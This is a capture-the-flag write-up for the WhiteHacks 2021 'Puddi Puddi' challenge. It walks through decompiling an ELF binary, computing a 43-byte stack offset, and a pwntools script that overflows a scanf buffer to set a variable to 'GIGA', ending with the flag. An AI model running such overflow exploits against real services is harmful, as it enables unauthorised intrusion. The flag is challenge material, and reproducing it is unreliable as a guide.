# Puddi Puddi
---

### Challenge Description

Why have a MEGA 🍮 when you can have a GIGA 🍮?

Interact with the service using nc chals.whitehacks.ctf.sg 20301 to get started!

---
### Challenge 

ooooooooo first binary exploitation for whitehacks yikes

Okay so we are given a ELF binary file... and a python exploit template (wow how generous WH)

When we execute the binary file, it takes an input 

```
Do you like pudding? (Y/N) => input

PUDDI PUDDI!

PUDDI PUDDI!

SUGOKU DEKKAI...

Oops we ran out of pudding...
```

How interesting. Let's get into breaking this apart

---
### Solution

So first, we decompile the binary file in Ghidra. From the main function, we obtain the following:

```

  __isoc99_scanf(&DAT_00100d87,input);
  puts("PUDDI PUDDI!");
  sleep(1);
  puts("PUDDI PUDDI!");
  sleep(1);
  puts("SUGOKU DEKKAI...");
  sleep(1);
  iVar1 = strcmp(size,"GIGA");
  if (iVar1 != 0) {
    puts("Oops we ran out of pudding...");

```

As you can see, the input is taken by ``__isoc99_scanf(&DAT_00100d87,input);``.

If you don't understand whatever is in the line of code, it's fine because I don't undestand either, decompiled code can get pretty messy.

The main point is that the function called scanf will take an input which is called input in this case.

It then compare a variable called ``size`` which was defined further up in the function and compares it with GIGA. If true, it prints out a flag.

Now the question is how can we use our input to change the size variable to hold GIGA so that the compare will be true and the code will print out flag? Buffer overflow.

_also remember there was an exploit template that was given which was meant for buffer overflow_

In order to buffer overflow, we need to know the offset between input and size, so we can determine how many bytes we need to overflow into the size variable.

Going back to our Ghidra, we go to the stack layout and we see the following.

```
size[5]         Stack[-0xd]:5      size
char[32]        Stack[-0x38]...    input
```

With some calculations, ``0x38 - 0xd = 43`` _you can do this in python_

We find that the offset is 43. Now we can start writing our exploit.

```py
from pwn import *
HOST = 'chals.whitehacks.ctf.sg' # name of the host to connect to
PORT = 20301  # number of the port to connect to 
io = remote(HOST, PORT) # connects to the service
io.recvuntil('Do you like pudding? (Y/N) => ') # receives data until input prompt
payload = b'A'*43 # to fill up all 43 bytes of offset so we can reach overflow
payload += b'GIGA' # GIGA will overflow into size
io.sendline(payload) # sends your payload to the service
io.interactive() # allows you to interact with service manually
```

VOILA!

A beautiful ASCII picture is printed and there is our flag.

```
[+] Opening connection to chals.whitehacks.ctf.sg on port 20301: Done
[*] Switching to interactive mode
PUDDI PUDDI!
PUDDI PUDDI!
SUGOKU DEKKAI...

 .d8888b.  8888888  .d8888b.         d8888       8888888b.  888     888 8888888b.  8888888b. 8888888 888 
d88P  Y88b   888   d88P  Y88b       d88888       888   Y88b 888     888 888  "Y88b 888  "Y88b  888   888 
888    888   888   888    888      d88P888       888    888 888     888 888    888 888    888  888   888 
888          888   888            d88P 888       888   d88P 888     888 888    888 888    888  888   888 
888  88888   888   888  88888    d88P  888       8888888P"  888     888 888    888 888    888  888   888 
888    888   888   888    888   d88P   888       888        888     888 888    888 888    888  888   Y8P 
Y88b  d88P   888   Y88b  d88P  d8888888888       888        Y88b. .d88P 888  .d88P 888  .d88P  888    "  
 "Y8888P88 8888888  "Y8888P88 d88P     888       888         "Y88888P"  8888888P"  8888888P" 8888888 888

WH2021{3880fba0faf0_g1g4_pudd1}
```
